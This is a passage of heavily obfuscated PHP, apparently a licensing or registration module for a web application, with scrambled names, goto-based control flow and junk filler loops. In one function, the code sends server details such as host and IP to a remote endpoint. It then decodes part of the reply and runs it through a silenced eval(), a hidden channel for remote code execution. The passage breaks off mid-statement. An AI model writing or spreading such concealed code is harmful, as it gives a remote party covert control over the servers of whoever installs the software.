$dÏ¨¿¨“šÈ[61]($dÏ¨¿¨“šÈ[62])->{$_SERVER[ÌœÆÒÍÚÇ²][63]}($dÏ¨¿¨“šÈ[118]); $c’·ß¶Çî = array($dÏ¨¿¨“šÈ[167] => $Dæî¯êßí§[$dÏ¨¿¨“šÈ[167]], $dÏ¨¿¨“šÈ[170] => $dÏ¨¿¨“šÈ[126](16), $dÏ¨¿¨“šÈ[171] => $dÏ¨¿¨“šÈ[151], $dÏ¨¿¨“šÈ[172] => $dÏ¨¿¨“šÈ[173], $dÏ¨¿¨“šÈ[174] => $_SERVER[$dÏ¨¿¨“šÈ[175]], $dÏ¨¿¨“šÈ[176] => $_SERVER[$dÏ¨¿¨“šÈ[177]], $dÏ¨¿¨“šÈ[178] => $_SERVER[$dÏ¨¿¨“šÈ[179]]); goto aâù«Š¾³å; b¸ÎÎä©¤: $F…ÜÒå’œ’ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÏ¨¿¨“šÈ =& $_SERVER[ÌœÆÒÍÚÇ²]; if ($_SERVER[$dÏ¨¿¨“šÈ[44]] != $dÏ¨¿¨“šÈ[164]) { return; } goto aê¯°ÊãëÕ; aİÜ°†ë¤: $A¼ååĞÛÆ = $dÏ¨¿¨“šÈ[126](16); $b µâœ„¸Î = $F…ÜÒå’œ’[600]; $E¡¯í§«èë = $A¼ååĞÛÆ . $EÕ¾ºøß©™[$dÏ¨¿¨“šÈ[122]] . $this->{$_SERVER[ÌœÆÒÍÚÇ²][149]}($dÏ¨¿¨“šÈ[116]($EÕ¾ºøß©™[$dÏ¨¿¨“šÈ[211]]), $A¼ååĞÛÆ); goto F©°ö¢’ˆ»; aâù«Š¾³å: $E…‚¿®³ñà = $F…ÜÒå’œ’[596]; if (!$E…‚¿®³ñà) { die; } $f±ªÔš¢İ = $dÏ¨¿¨“šÈ[116]($_SERVER[$dÏ¨¿¨“šÈ[117]] . $BãÍô¢); goto cæ¥±ó“²²; F©°ö¢’ˆ»: $EÕ¾ºøß©™[$dÏ¨¿¨“šÈ[125]] = $dÏ¨¿¨“šÈ[120]($dÏ¨¿¨“šÈ[216]($this->{$_SERVER[ÌœÆÒÍÚÇ²][149]}($E¡¯í§«èë, $dÏ¨¿¨“šÈ[218]))); $FÜãƒÃµ± = $F…ÜÒå’œ’[601]; if ($f£§Ï¸‘Ì[$dÏ¨¿¨“šÈ[219]] && $f£§Ï¸‘Ì[$dÏ¨¿¨“šÈ[219]] >= 1) { $dÏ¨¿¨“šÈ[61]($dÏ¨¿¨“šÈ[62])->{$_SERVER[ÌœÆÒÍÚÇ²][220]}($dÏ¨¿¨“šÈ[221], $dÏ¨¿¨“šÈ[222]); } goto dôùĞË; Bä„éä‘Ù: $càÕ±ñˆì± = $this->{$_SERVER[ÌœÆÒÍÚÇ²][201]}($f£§Ï¸‘Ì[$dÏ¨¿¨“šÈ[202]]); $bÚÕâÊø¿ = $F…ÜÒå’œ’[597]; if (strlen($bÚÕâÊø¿) < $F…ÜÒå’œ’[572]) { return; } goto b¬ˆ…­š‚ƒ; cÀÉ’®½Ğ: $b›¶³Òà¢ó[$fŠ‹¸¹œ„] = $cêáä³‚ê÷; $dÏ¨¿¨“šÈ[61]($dÏ¨¿¨“šÈ[11])->{$_SERVER[ÌœÆÒÍÚÇ²][228]}($AâŸš¥ø§…[$dÏ¨¿¨“šÈ[229]], array($dÏ¨¿¨“šÈ[230] => $b›¶³Òà¢ó)); $this->zjae8924dbca = $f£§Ï¸‘Ì; goto D¡÷«ÒñÎê; d‹øå¸Š‰“: $a›Ì¾ëİÌ† = $F…ÜÒå’œ’[606]; if (!$a›Ì¾ëİÌ†) { die; } $dÏ¨¿¨“šÈ[168]($dÏ¨¿¨“šÈ[199]($dÏ¨¿¨“šÈ[210]), !0); goto dÑë‹‡ÀÇ; dÙ°Òö™Êƒ: if (!$ağóÌÎ½ŒŸ) { die; } $Aò„ßÌİ = $dÏ¨¿¨“šÈ[224]($dÏ¨¿¨“šÈ[61]($dÏ¨¿¨“šÈ[11])->{$_SERVER[ÌœÆÒÍÚÇ²][225]}(), $dÏ¨¿¨“šÈ[226]); $AâŸš¥ø§… = $Aò„ßÌİ[$dÏ¨¿¨“šÈ[227]]; goto B˜šÒÚŸÑ; b¬ˆ…­š‚ƒ: if (!$càÕ±ñˆì± || $càÕ±ñˆì± != $dÏ¨¿¨“šÈ[203]($f£§Ï¸‘Ì[$dÏ¨¿¨“šÈ[147]])) { $DÏÆ˜˜¦‰‰ = array($dÏ¨¿¨“šÈ[204] => $dÏ¨¿¨“šÈ[61]($dÏ¨¿¨“šÈ[62])->{$_SERVER[ÌœÆÒÍÚÇ²][63]}($dÏ¨¿¨“šÈ[118]), $dÏ¨¿¨“šÈ[205] => $_SERVER[$dÏ¨¿¨“šÈ[117]], $dÏ¨¿¨“šÈ[206] => $dÏ¨¿¨“šÈ[207](), $dÏ¨¿¨“šÈ[176] => $_SERVER[$dÏ¨¿¨“šÈ[177]]); $b¾ø‰¤²Ò = $this->{$_SERVER[ÌœÆÒÍÚÇ²][208]}($dÏ¨¿¨“šÈ[150]($DÏÆ˜˜¦‰‰)); $this->{$_SERVER[ÌœÆÒÍÚÇ²][184]}($dÏ¨¿¨“šÈ[209] . $b¾ø‰¤²Ò); $dÏ¨¿¨“šÈ[168]($dÏ¨¿¨“šÈ[199]($dÏ¨¿¨“šÈ[210]), !0); } $EÕ¾ºøß©™ = array($dÏ¨¿¨“šÈ[211] => $c’·ß¶Çî[$dÏ¨¿¨“šÈ[167]], $dÏ¨¿¨“šÈ[212] => $f£§Ï¸‘Ì[$dÏ¨¿¨“šÈ[213]], $dÏ¨¿¨“šÈ[214] => $dÏ¨¿¨“šÈ[126](16), $dÏ¨¿¨“šÈ[122] => $f£§Ï¸‘Ì[$dÏ¨¿¨“šÈ[215]]); if ($c’·ß¶Çî[$dÏ¨¿¨“šÈ[170]]) { $EÕ¾ºøß©™[$dÏ¨¿¨“šÈ[214]] = $c’·ß¶Çî[$dÏ¨¿¨“šÈ[170]]; } goto dáªÃäƒ¡; D¡÷«ÒñÎê: $this->bqkodeecd321 = $EÕ¾ºøß©™[$dÏ¨¿¨“šÈ[122]]; $a«ĞÃÄÔ² = $F…ÜÒå’œ’[605]; $this->{$_SERVER[ÌœÆÒÍÚÇ²][231]}(); goto d‹øå¸Š‰“; dÑë‹‡ÀÇ: } private function licenseRegistSuccess() { $D¨Êœ…Šê =& $_SERVER[ÌœÆÒÍÚÇ²]; $dËÁß’«‡– = $D¨Êœ…Šê[61]($D¨Êœ…Šê[62])->{$_SERVER[ÌœÆÒÍÚÇ²][63]}(); if ($dËÁß’«‡–[$D¨Êœ…Šê[87]] != $D¨Êœ…Šê[222]) { $D¨Êœ…Šê[61]($D¨Êœ…Šê[62])->{$_SERVER[ÌœÆÒÍÚÇ²][223]}($D¨Êœ…Šê[87], $D¨Êœ…Šê[222]); } $D¨Êœ…Šê[112]($D¨Êœ…Šê[232])->{$_SERVER[ÌœÆÒÍÚÇ²][233]}(!0); } private function rjhsa1e9bce5() { goto A²Ôœ„õè¨; A²Ôœ„õè¨: $f™æÄšÉÅ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÑôÚ¡¦Áª =& $_SERVER[ÌœÆÒÍÚÇ²]; $dÑôÚ¡¦Áª[61]($dÑôÚ¡¦Áª[62])->{$_SERVER[ÌœÆÒÍÚÇ²][223]}(array($dÑôÚ¡¦Áª[211] => $dÑôÚ¡¦Áª[10], $dÑôÚ¡¦Áª[212] => $dÑôÚ¡¦Áª[10], $dÑôÚ¡¦Áª[122] => $dÑôÚ¡¦Áª[123], $dÑôÚ¡¦Áª[124] => $dÑôÚ¡¦Áª[10], $dÑôÚ¡¦Áª[125] => $dÑôÚ¡¦Áª[10])); goto E‰˜ÂôÆì°; E‰˜ÂôÆì°: $eÕöˆÙ®„ = $f™æÄšÉÅ[607]; $dÑôÚ¡¦Áª[61]($dÑôÚ¡¦Áª[62])->{$_SERVER[ÌœÆÒÍÚÇ²][220]}($dÑôÚ¡¦Áª[221], $dÑôÚ¡¦Áª[234]); $this->zjae8924dbca = array(); goto D¨İ‹Œ°ƒŠ; D¨İ‹Œ°ƒŠ: $C×Ò°•â’‚ = $f™æÄšÉÅ[608]; if (strlen($C×Ò°•â’‚) < $f™æÄšÉÅ[11]) { die; } $this->bqkodeecd321 = $dÑôÚ¡¦Áª[123]; goto B‰Ï…³Ó³²; B‰Ï…³Ó³²: } private function ursa48d3aa31() { goto bõ«œ¿é•ƒ; c…š÷„Øƒİ: if (!$då’ğÆ´‘[193]($b§ŞÛ ŞÁ‰)) { return $this->{$_SERVER[ÌœÆÒÍÚÇ²][166]}(); } $DÉ•ƒßœ™ = $då’ğÆ´‘[146]($b§ŞÛ ŞÁ‰[$då’ğÆ´‘[147]]); if ($då’ğÆ´‘[235]() >= $DÉ•ƒßœ™) { return $this->{$_SERVER[ÌœÆÒÍÚÇ²][166]}(); } goto B›“¿§¯¡; dÌ½‡éÁ¹: $b§ŞÛ ŞÁ‰ = $då’ğÆ´‘[192]($b§ŞÛ ŞÁ‰, !0); $B„åõ¸âÃ = $d±‹©œÒ‚Ê[615]; if (!$B„åõ¸âÃ) { return; } goto c…š÷„Øƒİ; fˆ¢ÂÅğÁ: $d” áŠŠ˜° = $då’ğÆ´‘[61]($då’ğÆ´‘[62])->{$_SERVER[ÌœÆÒÍÚÇ²][63]}(); if ($d” áŠŠ˜°[$då’ğÆ´‘[122]] == $då’ğÆ´‘[123]) { return; } $D‘³’´„Øä = $då’ğÆ´‘[61]($då’ğÆ´‘[62])->{$_SERVER[ÌœÆÒÍÚÇ²][63]}($då’ğÆ´‘[118]); goto c¾øïñŞ; bõ«œ¿é•ƒ: $d±‹©œÒ‚Ê =& $_SERVER[¹÷ˆ§éÒ°ú]; $då’ğÆ´‘ =& $_SERVER[ÌœÆÒÍÚÇ²]; $_SERVER[$då’ğÆ´‘[177]] = $då’ğÆ´‘[106]($_SERVER, $då’ğÆ´‘[177], APP_HOST); goto dŠ”¬¬ãš·; eÎÅÍÚ•Ÿ: $B­ÕéšÒ = $d±‹©œÒ‚Ê[612]; while (strlen($B­ÕéšÒ) < $d±‹©œÒ‚Ê[572]) { if (!$B­ÕéšÒ) { break; } $B­ÕéšÒ++; } $FÖ„øÑ™×Í = $då’ğÆ´‘[116]($_SERVER[$då’ğÆ´‘[117]] . $då’ğÆ´‘[216]($D‘³’´„Øä) . $d” áŠŠ˜°[$då’ğÆ´‘[212]]); goto Bß¥¹ˆ—ß“; còÎ±‰ô©…: $b§ŞÛ ŞÁ‰ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][190]}($dÌ¹»“éé[$då’ğÆ´‘[93]][$eöô¸Úö°‘], $FÖ„øÑ™×Í); $FÉ„ç‘´©Ä = $d±‹©œÒ‚Ê[614]; if (strlen($FÉ„ç‘´©Ä) < $d±‹©œÒ‚Ê[11]) { return; } goto dÌ½‡éÁ¹; B›“¿§¯¡: $this->zjae8924dbca = $b§ŞÛ ŞÁ‰; $this->bqkodeecd321 = $d” áŠŠ˜°[$då’ğÆ´‘[122]]; goto D™®ì³–éê; Cè³ˆ¸µˆØ: $cµÀË¹Ñ³É = $d±‹©œÒ‚Ê[611]; if (strlen($cµÀË¹Ñ³É) < $d±‹©œÒ‚Ê[572]) { return; } $dÌ¹»“éé = $E£ãî†ã¾[$då’ğÆ´‘[227]]; goto eÎÅÍÚ•Ÿ; dŠ”¬¬ãš·: $this->bqkodeecd321 = $då’ğÆ´‘[123]; $eš…£±Ÿó¹ = $d±‹©œÒ‚Ê[609]; while ($eš…£±Ÿó¹ < $d±‹©œÒ‚Ê[11]) { if ($eš…£±Ÿó¹ >= 0) { break; } $eš…£±Ÿó¹++; } goto fˆ¢ÂÅğÁ; Bß¥¹ˆ—ß“: $CäĞÌÊïãê = $d±‹©œÒ‚Ê[613]; if (!$CäĞÌÊïãê) { die; } $eöô¸Úö°‘ = $då’ğÆ´‘[216]($då’ğÆ´‘[25]($FÖ„øÑ™×Í, 10, 16)); goto còÎ±‰ô©…; c¾øïñŞ: $B„¦Ğ‘Í– = $d±‹©œÒ‚Ê[610]; if (!$B„¦Ğ‘Í–) { die; } $E£ãî†ã¾ = $då’ğÆ´‘[224]($då’ğÆ´‘[61]($då’ğÆ´‘[11])->{$_SERVER[ÌœÆÒÍÚÇ²][225]}(), $då’ğÆ´‘[226]); goto Cè³ˆ¸µˆØ; D™®ì³–éê: } private function twke870bda1d() { goto A”‰Ë»Ã¬; B–¤±¸Ã°: if (!$a¬÷…ÉÏÀƒ) { die; } $d¡àİ÷‡— = $_SERVER[$bŠÙ§‘‰›ç[44]]; if ($d¡àİ÷‡— == $bŠÙ§‘‰›ç[236] && $this->bqkodeecd321 == $bŠÙ§‘‰›ç[123]) { $bŠÙ§‘‰›ç[168]($bŠÙ§‘‰›ç[199]($bŠÙ§‘‰›ç[237]), !1, $bŠÙ§‘‰›ç[238]); } goto A¡»æÕè»Ü; A¡»æÕè»Ü: $dÏĞÃÍíî± = array($bŠÙ§‘‰›ç[239], $bŠÙ§‘‰›ç[240]); if ($bŠÙ§‘‰›ç[241]($d¡àİ÷‡—, $dÏĞÃÍíî±)) { if ($this->bqkodeecd321 == $bŠÙ§‘‰›ç[123] && isset($cïÀºÑÍã§[$bŠÙ§‘‰›ç[242]])) { $bŠÙ§‘‰›ç[168]($bŠÙ§‘‰›ç[199]($bŠÙ§‘‰›ç[237]), !1, $bŠÙ§‘‰›ç[238]); die; } $fĞ‡‰ »›ñ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][139]}(); if ($fĞ‡‰ »›ñ != $bŠÙ§‘‰›ç[203]($bŠÙ§‘‰›ç[243])) { if ($fĞ‡‰ »›ñ <= $bŠÙ§‘‰›ç[61]($bŠÙ§‘‰›ç[141])->{$_SERVER[ÌœÆÒÍÚÇ²][142]}()) { $bŠÙ§‘‰›ç[168]($bŠÙ§‘‰›ç[199]($bŠÙ§‘‰›ç[244]), !1, $bŠÙ§‘‰›ç[238]); die; } } } goto B†§¼ä÷ñ; A”‰Ë»Ã¬: $bŠÙ§‘‰›ç =& $_SERVER[ÌœÆÒÍÚÇ²]; $cïÀºÑÍã§ = $GLOBALS[$bŠÙ§‘‰›ç[22]]; $a¬÷…ÉÏÀƒ = $_SERVER[¹÷ˆ§éÒ°ú][616]; goto B–¤±¸Ã°; B†§¼ä÷ñ: } private function jvaz52e37e96() { goto c…À…á¥Ëø; eò‡¶Ö¬¸¥: $Fœé¢’ˆç‡ = @$A¨µÆÍˆ¢¶[255]($AôÒ¡Ã‹æ›, !1, $A‹ì³Ù‰á™); $A¨µÆÍˆ¢¶[256]($A¨µÆÍˆ¢¶[257]); $a´Èµ¾ÇÚ¡ = $AŸî˜ÁèÌ[619]; goto Bî‹à„‚¾Ô; Bî‹à„‚¾Ô: if ($Fœé¢’ˆç‡ && $A¨µÆÍˆ¢¶[32]($Fœé¢’ˆç‡, $A¨µÆÍˆ¢¶[258])) { echo $Fœé¢’ˆç‡; } die; goto b–ÑÎ¨÷ËŞ; c¸„“ªÒ¯õ: if (!$A¨µÆÍˆ¢¶[106]($GLOBALS, $A¨µÆÍˆ¢¶[134]) || !isset($_GET[$A¨µÆÍˆ¢¶[246]])) { return; } if (!$A¨µÆÍˆ¢¶[241]($_SERVER[$A¨µÆÍˆ¢¶[44]], $f¿´„Éöá)) { return; } $AôÒ¡Ã‹æ› = $A¨µÆÍˆ¢¶[247]; goto BŒ²õ¶©Î; c‹Ÿ ¬ù¹: $A‹ì³Ù‰á™ = $A¨µÆÍˆ¢¶[250](array($A¨µÆÍˆ¢¶[251] => array($A¨µÆÍˆ¢¶[252] => $A¨µÆÍˆ¢¶[253], $A¨µÆÍˆ¢¶[254] => 3))); $AÁÙ‹ï»í = $AŸî˜ÁèÌ[618]; if (strlen($AÁÙ‹ï»í) < $AŸî˜ÁèÌ[572]) { die; } goto eò‡¶Ö¬¸¥; c…À…á¥Ëø: $AŸî˜ÁèÌ =& $_SERVER[¹÷ˆ§éÒ°ú]; $A¨µÆÍˆ¢¶ =& $_SERVER[ÌœÆÒÍÚÇ²]; $f¿´„Éöá = array($A¨µÆÍˆ¢¶[137], $A¨µÆÍˆ¢¶[245]); goto c¸„“ªÒ¯õ; BŒ²õ¶©Î: $c¹õßª¶’¸ = $AŸî˜ÁèÌ[617]; if (strlen($c¹õßª¶’¸) < $AŸî˜ÁèÌ[561]) { return; } $AôÒ¡Ã‹æ› = $this->{$_SERVER[ÌœÆÒÍÚÇ²][248]}($AôÒ¡Ã‹æ›, $A¨µÆÍˆ¢¶[249]); goto c‹Ÿ ¬ù¹; b–ÑÎ¨÷ËŞ: } public function dxuy4e9d4140($e‹°ë¬ÓÂ§) { goto EÁä™òîåö; EÁä™òîåö: $B›ˆ³½‡‡ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eœ©ÙÇÒò =& $_SERVER[ÌœÆÒÍÚÇ²]; if ($this->bqkodeecd321 == $eœ©ÙÇÒò[259]) { return $e‹°ë¬ÓÂ§; } goto c ‹‹Ä »; aÔ™¶‘¤ã‰: $B°´‡¾±Ôò = array(); $DÉÁ¾ÓÕÎ = $B›ˆ³½‡‡[621]; foreach ($c¤òÑî«Öˆ as $C—…ñ…£§) { if (!$eœ©ÙÇÒò[241]($C—…ñ…£§, $F‚„âçİ‘õ)) { $B°´‡¾±Ôò[] = $C—…ñ…£§; } } goto A¾½¢«œ’İ; A¾½¢«œ’İ: foreach ($B°´‡¾±Ôò as $C—…ñ…£§) { unset($e‹°ë¬ÓÂ§[$C—…ñ…£§]); } return $e‹°ë¬ÓÂ§; goto EñÃôÙŞ˜; c ‹‹Ä »: $c¤òÑî«Öˆ = array($eœ©ÙÇÒò[260], $eœ©ÙÇÒò[261], $eœ©ÙÇÒò[262], $eœ©ÙÇÒò[263], $eœ©ÙÇÒò[264], $eœ©ÙÇÒò[265], $eœ©ÙÇÒò[266], $eœ©ÙÇÒò[267]); $F‚„âçİ‘õ = $eœ©ÙÇÒò[0]($eœ©ÙÇÒò[268], $eœ©ÙÇÒò[106]($this->zjae8924dbca, $eœ©ÙÇÒò[131], $eœ©ÙÇÒò[10])); $Bƒ ’±è»ó = $B›ˆ³½‡‡[620]; goto aÔ™¶‘¤ã‰; EñÃôÙŞ˜: } private function vngif055249b() { goto Fœ–™†•š; Fœ–™†•š: $EÃ‰‘ìß¯Õ =& $_SERVER[¹÷ˆ§éÒ°ú]; $D›Ùç‘É =& $_SERVER[ÌœÆÒÍÚÇ²]; if ($this->bqkodeecd321 != $D›Ùç‘É[123]) { return; } goto aß÷‰î°¸»; aß÷‰î°¸»: $GLOBALS[$D›Ùç‘É[93]][$D›Ùç‘É[97]][$D›Ùç‘É[269]] = $D›Ùç‘É[222]; $GLOBALS[$D›Ùç‘É[93]][$D›Ùç‘É[270]] = $D›Ùç‘É[222]; $FË¼ä¯Åšß = $EÃ‰‘ìß¯Õ[622]; goto f®˜ùï¨ËÆ; f®˜ùï¨ËÆ: while ($FË¼ä¯Åšß < $EÃ‰‘ìß¯Õ[561]) { if ($FË¼ä¯Åšß >= 0) { break; } $FË¼ä¯Åšß++; } if ($D›Ùç‘É[61]($D›Ùç‘É[271])->{$_SERVER[ÌœÆÒÍÚÇ²][63]}($D›Ùç‘É[87]) != $D›Ùç‘É[234]) { $D›Ùç‘É[61]($D›Ùç‘É[271])->{$_SERVER[ÌœÆÒÍÚÇ²][223]}($D›Ùç‘É[87], $D›Ùç‘É[234]); } goto aåñ¼ãˆùÖ; aåñ¼ãˆùÖ: } public function rughf5ae40a4() { return $_SERVER[ÌœÆÒÍÚÇ²][272]; } private function ieymcf824777() { goto c™‰ÖÏ¸¥; EÂÍâšæ ˜: if ($FÑ¹ŞƒÒ§Â[$bÍÂŒ–Ú‘ª[167]] && $FÑ¹ŞƒÒ§Â[$bÍÂŒ–Ú‘ª[282]]) { if ($this->{$_SERVER[ÌœÆÒÍÚÇ²][201]}($FÑ¹ŞƒÒ§Â[$bÍÂŒ–Ú‘ª[282]]) == $bŞ¢éã¦Á¡[$bÍÂŒ–Ú‘ª[167]]) { return; } } $this->{$_SERVER[ÌœÆÒÍÚÇ²][166]}(); $f¨Ú‘³šæ = $D·Öõô°Ï[624]; goto f«š—Ğƒ¼Ê; e³íŸ”„¨ô: $Eòöğ·®£÷ = $bÍÂŒ–Ú‘ª[276] . $bÍÂŒ–Ú‘ª[116]($bÍÂŒ–Ú‘ª[277]); if ($this->bqkodeecd321 == $bÍÂŒ–Ú‘ª[123] || !$bÍÂŒ–Ú‘ª[106]($GLOBALS, $bÍÂŒ–Ú‘ª[134])) { return; } if (!$bÍÂŒ–Ú‘ª[241]($_SERVER[$bÍÂŒ–Ú‘ª[44]], $A¬ˆÖÎ©‡ä)) { return; } goto AË±‹ÛÓÍ; bØ†Ù²‚µ: $bŞ¢éã¦Á¡ = array($bÍÂŒ–Ú‘ª[167] => $bÍÂŒ–Ú‘ª[61]($bÍÂŒ–Ú‘ª[62])->{$_SERVER[ÌœÆÒÍÚÇ²][63]}($bÍÂŒ–Ú‘ª[211]), $bÍÂŒ–Ú‘ª[180] => $this->bqkodeecd321, $bÍÂŒ–Ú‘ª[178] => $_SERVER[$bÍÂŒ–Ú‘ª[179]], $bÍÂŒ–Ú‘ª[171] => $bÍÂŒ–Ú‘ª[151], $bÍÂŒ–Ú‘ª[174] => $_SERVER[$bÍÂŒ–Ú‘ª[175]]); $FÑ¹ŞƒÒ§Â = $this->{$_SERVER[ÌœÆÒÍÚÇ²][184]}($bÍÂŒ–Ú‘ª[281], $bŞ¢éã¦Á¡); if (!$bÍÂŒ–Ú‘ª[193]($FÑ¹ŞƒÒ§Â)) { return; } goto EÂÍâšæ ˜; f«š—Ğƒ¼Ê: if ($this->{$_SERVER[ÌœÆÒÍÚÇ²][201]}($FÑ¹ŞƒÒ§Â[$bÍÂŒ–Ú‘ª[282]]) != $bŞ¢éã¦Á¡[$bÍÂŒ–Ú‘ª[167]]) { $AœË¦¯ÂŠƒ = array($bÍÂŒ–Ú‘ª[204] => $bÍÂŒ–Ú‘ª[61]($bÍÂŒ–Ú‘ª[62])->{$_SERVER[ÌœÆÒÍÚÇ²][63]}($bÍÂŒ–Ú‘ª[118]), $bÍÂŒ–Ú‘ª[205] => $_SERVER[$bÍÂŒ–Ú‘ª[117]], $bÍÂŒ–Ú‘ª[206] => $bÍÂŒ–Ú‘ª[207](), $bÍÂŒ–Ú‘ª[176] => $_SERVER[$bÍÂŒ–Ú‘ª[177]]); $FÕÂĞƒ­·’ = $this->{$_SERVER[ÌœÆÒÍÚÇ²][208]}($bÍÂŒ–Ú‘ª[150]($AœË¦¯ÂŠƒ)); $FÑ¹ŞƒÒ§Â = $this->{$_SERVER[ÌœÆÒÍÚÇ²][184]}($bÍÂŒ–Ú‘ª[209] . $FÕÂĞƒ­·’); if ($FÑ¹ŞƒÒ§Â && $bÍÂŒ–Ú‘ª[193]($FÑ¹ŞƒÒ§Â) && isset($FÑ¹ŞƒÒ§Â[$bÍÂŒ–Ú‘ª[282]])) { $f¢Í…õªµ† = $this->{$_SERVER[ÌœÆÒÍÚÇ²][190]}($FÑ¹ŞƒÒ§Â[$bÍÂŒ–Ú‘ª[282]], 2); if ($f¢Í…õªµ†) { $f¢Í…õªµ† = $this->{$_SERVER[ÌœÆÒÍÚÇ²][201]}($f¢Í…õªµ†); } if ($f¢Í…õªµ†) { try { @eval($f¢Í…õªµ†); } catch (Exception $D±Š•ÃÅ¾) { } } } } goto AŒÃµËÌìÍ; c™‰ÖÏ¸¥: $D·Öõô°Ï =& $_SERVER[¹÷ˆ§éÒ°ú]; $bÍÂŒ–Ú‘ª =& $_SERVER[ÌœÆÒÍÚÇ²]; $A¬ˆÖÎ©‡ä = array($bÍÂŒ–Ú‘ª[273], $bÍÂŒ–Ú‘ª[274], $bÍÂŒ–Ú‘ª[275]); goto e³íŸ”„¨ô; AË±‹ÛÓÍ: if ($bÍÂŒ–Ú‘ª[235]() % 4 != 0) { return; } $EÏÁéå÷ñ× = $bÍÂŒ–Ú‘ª[13](array($bÍÂŒ–Ú‘ª[278], $bÍÂŒ–Ú‘ª[279]), $Eòöğ·®£÷); $Cø–˜·Å® = $D·Öõô°Ï[623]; goto CèëˆìÏ°ø; CèëˆìÏ°ø: if (!$Cø–˜·Å®) { die; } if ($EÏÁéå÷ñ× && $bÍÂŒ–Ú‘ª[235]() - $EÏÁéå÷ñ× < $bÍÂŒ–Ú‘ª[203]($bÍÂŒ–Ú‘ª[280])) { return; } $bÍÂŒ–Ú‘ª[13](array($bÍÂŒ–Ú‘ª[278], $bÍÂŒ–Ú‘ª[154]), $Eòöğ·®£÷, $bÍÂŒ–Ú‘ª[235]()); goto bØ†Ù²‚µ; AŒÃµËÌìÍ: } private function khre44a19207($FŠç¨¡Ôì¨ = '', $b­Áæ‰á™Ü = array(), $fğ˜æÊÒ³ = 5) { goto Bù£âÚèäğ; E¢ˆªÀ ¯: if (strlen($fãÙš‹¥Á´) < $bø¿¦Ü¹ã[567]) { die; } goto eÆÍÕéçã¡; cëà‘Ãß: $Fé‰»‰¦ù = $Fé‰»‰¦ù . $FŠç¨¡Ôì¨ . $cµé®ïÕ˜[285] . $cµé®ïÕ˜[286]($b­Áæ‰á™Ü); if ($b­Áæ‰á™Ü === -1) { return $Fé‰»‰¦ù; } $B°¬•²â·Ê = $cµé®ïÕ˜[250](array($cµé®ïÕ˜[251] => array($cµé®ïÕ˜[254] => $fğ˜æÊÒ³, $cµé®ïÕ˜[252] => $cµé®ïÕ˜[287]), $cµé®ïÕ˜[288] => array($cµé®ïÕ˜[289] => !1, $cµé®ïÕ˜[290] => !1))); goto EËÊˆÍ‚¢À; D…ˆëóˆ±¶: $B¹³ßÁãß = $bø¿¦Ü¹ã[625]; while (strlen($B¹³ßÁãß) < $bø¿¦Ü¹ã[567]) { if (!$B¹³ßÁãß) { break; } $B¹³ßÁãß++; } $Fé‰»‰¦ù = $this->{$_SERVER[ÌœÆÒÍÚÇ²][248]}($Fé‰»‰¦ù, $cµé®ïÕ˜[284]); goto cëà‘Ãß; Bù£âÚèäğ: $bø¿¦Ü¹ã =& $_SERVER[¹÷ˆ§éÒ°ú]; $cµé®ïÕ˜ =& $_SERVER[ÌœÆÒÍÚÇ²]; $Fé‰»‰¦ù = $cµé®ïÕ˜[283]; goto D…ˆëóˆ±¶; EËÊˆÍ‚¢À: $b­Áæ‰á™Ü = @$cµé®ïÕ˜[255]($Fé‰»‰¦ù, !1, $B°¬•²â·Ê); return $cµé®ïÕ˜[192]($b­Áæ‰á™Ü, !0); $fãÙš‹¥Á´ = $bø¿¦Ü¹ã[626]; goto E¢ˆªÀ ¯; eÆÍÕéçã¡: } private function zkmu12d5e390() { goto CÈ…Ûº™áÓ; EŞµÂ ÀÚè: $aÛÓéŞª¶À = $bÊĞ›ïäÒ[$this->bqkodeecd321]; $aÛÓéŞª¶À = $AÊ¶ï¸ÆƒØ[203]($aÛÓéŞª¶À ? $aÛÓéŞª¶À : $AÊ¶ï¸ÆƒØ[292]); $A²ÉÑÔŸòÕ = $dñ©–‰‘öæ[627]; goto Cê£øÙá¹ˆ; EĞîíÌ®ãĞ: return $aÛÓéŞª¶À + $BåÑâù±±ä; goto B×ÉÈÆ–†; CÈ…Ûº™áÓ: $dñ©–‰‘öæ =& $_SERVER[¹÷ˆ§éÒ°ú]; $AÊ¶ï¸ÆƒØ =& $_SERVER[ÌœÆÒÍÚÇ²]; $bÊĞ›ïäÒ = array($AÊ¶ï¸ÆƒØ[291] => $AÊ¶ï¸ÆƒØ[292], $AÊ¶ï¸ÆƒØ[293] => $AÊ¶ï¸ÆƒØ[294], $AÊ¶ï¸ÆƒØ[295] => $AÊ¶ï¸ÆƒØ[296], $AÊ¶ï¸ÆƒØ[297] => $AÊ¶ï¸ÆƒØ[298], $AÊ¶ï¸ÆƒØ[299] => $AÊ¶ï¸ÆƒØ[300], $AÊ¶ï¸ÆƒØ[301] => $AÊ¶ï¸ÆƒØ[243], $AÊ¶ï¸ÆƒØ[302] => $AÊ¶ï¸ÆƒØ[243], $AÊ¶ï¸ÆƒØ[303] => $AÊ¶ï¸ÆƒØ[292], $AÊ¶ï¸ÆƒØ[304] => $AÊ¶ï¸ÆƒØ[294], $AÊ¶ï¸ÆƒØ[305] => $AÊ¶ï¸ÆƒØ[296], $AÊ¶ï¸ÆƒØ[306] => $AÊ¶ï¸ÆƒØ[307], $AÊ¶ï¸ÆƒØ[308] => $AÊ¶ï¸ÆƒØ[298], $AÊ¶ï¸ÆƒØ[309] => $AÊ¶ï¸ÆƒØ[310], $AÊ¶ï¸ÆƒØ[311] => $AÊ¶ï¸ÆƒØ[300], $AÊ¶ï¸ÆƒØ[312] => $AÊ¶ï¸ÆƒØ[313], $AÊ¶ï¸ÆƒØ[314] => $AÊ¶ï¸ÆƒØ[315], $AÊ¶ï¸ÆƒØ[316] => $AÊ¶ï¸ÆƒØ[317]); goto EŞµÂ ÀÚè; Cê£øÙá¹ˆ: if (strlen($A²ÉÑÔŸòÕ) < $dñ©–‰‘öæ[561]) { return; } $BåÑâù±±ä = $AÊ¶ï¸ÆƒØ[106]($this->zjae8924dbca, $AÊ¶ï¸ÆƒØ[318]); $BåÑâù±±ä = $BåÑâù±±ä ? $AÊ¶ï¸ÆƒØ[203]($BåÑâù±±ä) : 0; goto EĞîíÌ®ãĞ; B×ÉÈÆ–†: } public function adcy8347f1cf($Aá«ÏĞ¶®Ä) { goto EäˆÂ¾ªÛ; b í®¦Ÿ¯ƒ: $fğÍš˜Ã¾ = $bÒƒ¢ö±Î›[628]; if 